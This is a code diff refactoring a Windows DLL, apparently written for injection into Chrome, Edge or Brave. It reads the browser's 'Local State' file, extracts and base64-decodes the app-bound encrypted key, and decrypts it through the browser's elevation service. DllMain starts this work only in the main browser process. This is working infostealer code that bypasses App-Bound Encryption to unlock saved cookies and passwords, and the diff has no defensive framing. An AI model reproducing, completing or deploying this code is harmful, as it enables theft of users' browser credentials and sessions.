@@ -1,15 +1,11 @@
+#define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 #include <string>
 #include <vector>
-#include <filesystem>
-#include <fstream>
-#include <thread>
 #include <algorithm>
 #include <wincrypt.h>
 #include <shlobj.h>
 #include <objbase.h>
-
-namespace fs = std::filesystem;
 
 enum class Browser { Chrome, Edge, Brave };
 
@@ -92,33 +88,17 @@ static std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsign
     return res;
 }
 
-static std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
-    static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-    int in_len = (int)encoded_string.size();
-    int i = 0, j = 0, in_ = 0;
-    unsigned char char_array_4[4], char_array_3[3];
-    std::vector<unsigned char> ret;
-    ret.reserve(in_len * 3 / 4);
-    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
-        char_array_4[i++] = encoded_string[in_]; in_++;
-        if (i == 4) {
-            for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);
-            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-            for (i = 0; (i < 3); i++) ret.push_back(char_array_3[i]);
-            i = 0;
-        }
+static std::vector<unsigned char> base64_decode(const std::string& s) {
+    static const std::string b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    std::vector<unsigned char> out; out.reserve(s.size() * 3 / 4);
+    int val = 0, valb = -8;
+    for (unsigned char c : s) {
+        if (b64.find(c) == std::string::npos) break;
+        val = (val << 6) + (int)b64.find(c);
+        valb += 6;
+        if (valb >= 0) { out.push_back(char((val >> valb) & 0xFF)); valb -= 8; }
     }
-    if (i) {
-        for (j = i; j < 4; j++) char_array_4[j] = 0;
-        for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
-        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
-        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
-        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
-        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
-    }
-    return ret;
+    return out;
 }
 
 static Browser get_browser() {
@@ -131,27 +111,31 @@ static Browser get_browser() {
     return Browser::Chrome;
 }
 
+static std::string read_file_win32(const wchar_t* path) {
+    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+    if (h == INVALID_HANDLE_VALUE) return "";
+    LARGE_INTEGER sz;
+    if (!GetFileSizeEx(h, &sz) || sz.QuadPart == 0) { CloseHandle(h); return ""; }
+    std::string data; data.resize((size_t)sz.QuadPart);
+    DWORD read;
+    if (!ReadFile(h, &data[0], (DWORD)sz.QuadPart, &read, nullptr)) { CloseHandle(h); return ""; }
+    CloseHandle(h);
+    return data;
+}
+
 static void do_work() {
     try {
         Browser browser = get_browser();
         wchar_t szPath[MAX_PATH];
         if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return;
-        fs::path data_path(szPath);
+        std::wstring data_path(szPath);
 
-        if (browser == Browser::Chrome) data_path /= L"Google/Chrome/User Data";
-        else if (browser == Browser::Edge) data_path /= L"Microsoft/Edge/User Data";
-        else data_path /= L"BraveSoftware/Brave-Browser/User Data";
+        if (browser == Browser::Chrome) data_path += L"\\Google\\Chrome\\User Data\\Local State";
+        else if (browser == Browser::Edge) data_path += L"\\Microsoft\\Edge\\User Data\\Local State";
+        else data_path += L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
 
-        std::string ls_str;
-        std::ifstream ls_file(data_path / L"Local State", std::ios::binary | std::ios::ate);
-        if (ls_file) {
-            auto size = ls_file.tellg();
-            if (size > 0) {
-                ls_str.resize((size_t)size);
-                ls_file.seekg(0, std::ios::beg);
-                ls_file.read(&ls_str[0], size);
-            }
-        }
+        std::string ls_str = read_file_win32(data_path.c_str());
+        if (ls_str.empty()) return;
 
         size_t pos = ls_str.find("\"app_bound_encrypted_key\":\"");
         if (pos == std::string::npos) {
@@ -165,6 +149,7 @@ static void do_work() {
             if (end != std::string::npos) {
                 std::string key_b64 = ls_str.substr(pos, end - pos);
                 auto decoded = base64_decode(key_b64);
+                if (decoded.empty()) return;
                 std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
                 auto v20_key = decrypt_with_elevator(blob, browser);
 
@@ -197,6 +182,7 @@ extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvRe
     if (fdwReason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hinstDLL);
         std::wstring cmd = GetCommandLineW();
+        // Only run in the main process, not in utility or renderer processes
         if (cmd.find(L"--type=") == std::wstring::npos) {
             HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
             if (hThread) CloseHandle(hThread);
